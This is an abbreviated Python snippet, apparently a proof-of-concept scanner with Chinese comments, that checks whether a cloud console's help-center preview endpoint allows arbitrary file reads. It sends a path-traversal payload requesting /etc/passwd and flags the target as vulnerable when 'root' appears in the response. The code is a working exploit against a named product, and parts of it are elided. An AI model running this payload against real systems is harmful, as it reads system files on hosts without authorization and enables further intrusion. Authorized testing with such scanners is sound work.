...
def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd"
        ...
        if response.status_code == 200 and 'root' in response.text:
            print(f"{RED}URL [{url}] 存在移动云控制台存在任意文件读取漏洞。{RESET}")
        else:
...
def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在移动云控制台存在任意文件读取漏洞。')
